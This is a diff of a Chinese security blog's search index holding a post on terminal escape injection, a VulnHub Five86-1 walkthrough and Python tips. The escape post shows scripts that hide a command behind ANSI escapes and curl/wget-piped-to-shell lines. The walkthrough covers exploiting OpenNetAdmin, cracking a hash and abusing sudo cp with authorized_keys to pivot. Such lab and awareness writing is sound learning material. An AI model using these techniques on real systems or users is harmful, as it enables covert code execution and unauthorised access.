+<li>几乎所有你能想象到的东西都有(执行恶意文件的用户权限越高，后果越严重)</li>
+</ul>
+<br>
+
+<p>除了将它们植入到各种脚本中，还可以植入到：</p>
+<ul>
+<li>配置文件 – 可能会产生同样的影响(ACE)</li>
+<li>日志文件 – 作为侦查绕过工作的一部分</li>
+</ul>
+<br>
+
+<p>如原博文说的，Linux、macOS、Windows10(TH2之后) ，只要是支持 ANSI/VT 转义序列的终端模拟器都会受影响</p>
+<h2 id="如何避免这种攻击"><a href="#如何避免这种攻击" class="headerlink" title="如何避免这种攻击"></a>如何避免这种攻击</h2><p>提高安全意识！<br>提高安全意识！！<br>提高安全意识！！！</p>
+<p>一般从互联网上下载的便捷脚本或配置文件自己多少都会看几眼的吧，那便再多看几眼，这样就可以了</p>
+<p>查看文件内容使用 <code>cat -v</code> 或 <code>less</code>、<code>more</code>、<code>vim</code> .（<code>alias cat=&quot;cat -v&quot;</code> ）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">####### $ more filename.sh #######</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">ESC[2AESC[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
+
+<p>避免仅通过 <code>curl/wget</code> 管道化到 shell 中来安装网络上的脚本或程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL <span class="string">"https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh"</span> | /bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget -e robots=off -O- https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="curl.gif" alt="curl"> </p>
+<h2 id="原博文"><a href="#原博文" class="headerlink" title="原博文"></a>原博文</h2><ul>
+<li><a href="https://www.infosecmatter.com/terminal-escape-injection" target="_blank" rel="noopener">Terminal Escape Injection</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>技能学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Five86-1</title>
+    <url>/2020/03/10/Five86-1/</url>
+    <content><![CDATA[<blockquote>
+<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
+</blockquote>
+<br>
+
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>扫服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<hr>
+<br>
+
+<p>访问 80 端口，无有价值信息</p>
+<p>例行扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>经访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>搜索相关漏洞，得到远程命令执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
+
+<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
+<br>
+
+<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+<p>使用 MSF：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
+<br>
+
+<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
+
+<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
+<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
+<br>
+
+<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>涉及知识的盲区了，特地去查询记录了一下</p>
+<br>
+
+<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<br>
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+
+<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
+<br>
+<br>
+
+<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
+<br>
+
+<p>不过，也是学到技能了</p>
+<br>
+
+<p>也可以使用如下方式：</p>
+<ul>
+<li>创建一个权限 <code>777</code> 的文件</li>
+<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
+<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
+<li><code>cat</code> 查看</li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python不常用用法</title>
+    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+<a id="more"></a>
+
+<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -2103,58 +2155,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       <tags>
         <tag>技巧</tag>
         <tag>Command</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Terminal Escape Injection</title>
-    <url>/2020/04/21/Terminal-Escape-Injection/</url>
-    <content><![CDATA[<p><img src="2020-04-22-10.33.50.gif" alt="2020-04-22-10.33.50"></p>
-<br>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2A^[[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>查看文件内容时(<code>cat</code>、<code>tail</code>)，命令遇到了转义字符并执行了转义改变了光标的位置，转义所在行的内容覆盖了(执行转义)转义指定处的内容，呈现在用户眼前的是覆盖后的样子；此脚本被执行，程序正常执行包括恶意代码在内到 <code>exit</code> 的所有内容。看到的内容和执行的内容不同</p>
-<p>恶意代码的长度若是超出伪装字符，会出现如下情况（那就<code>^[[K</code>擦除行）：</p>
-<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-21-22-%E6%88%AA%E5%B1%8F2020-04-21%2022.03.22-zU0amB.png" alt="超出伪装字符"></p>
-<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
-<li>任意代码执行（ACE）</li>
-<li>在我们的系统上安装后门(RAT)</li>
-<li>在我们的系统中植入恶意软件或rootkit</li>
-<li>捕捉按键，记录我们的屏幕</li>
-<li>几乎所有你能想象到的东西都有(执行恶意文件的用户权限越高，后果越严重)</li>
-</ul>
-<br>
-
-<p>除了将它们植入到各种脚本中，还可以植入到：</p>
-<ul>
-<li>配置文件 – 可能会产生同样的影响(ACE)</li>
-<li>日志文件 – 作为侦查绕过工作的一部分</li>
-</ul>
-<br>
-
-<p>如原博文说的，Linux、macOS、Windows10(TH2之后) ，只要是支持 ANSI/VT 转义序列的终端模拟器都会受影响</p>
-<h2 id="如何避免这种攻击"><a href="#如何避免这种攻击" class="headerlink" title="如何避免这种攻击"></a>如何避免这种攻击</h2><p>提高安全意识！<br>提高安全意识！！<br>提高安全意识！！！</p>
-<p>一般从互联网上下载的便捷脚本或配置文件自己多少都会看几眼的吧，那便再多看几眼，这样就可以了</p>
-<p>查看文件内容使用 <code>cat -v</code> 或 <code>less</code>、<code>more</code>、<code>vim</code> .（<code>alias cat=&quot;cat -v&quot;</code> ）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">####### $ more filename.sh #######</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">ESC[2AESC[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
-
-<p>避免仅通过 <code>curl/wget</code> 管道化到 shell 中来安装网络上的脚本或程序</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL <span class="string">"https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh"</span> | /bin/sh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget -e robots=off -O- https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="curl.gif" alt="curl"> </p>
-<h2 id="原博文"><a href="#原博文" class="headerlink" title="原博文"></a>原博文</h2><ul>
-<li><a href="https://www.infosecmatter.com/terminal-escape-injection" target="_blank" rel="noopener">Terminal Escape Injection</a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>技能学习</tag>
       </tags>
   </entry>
 </search>
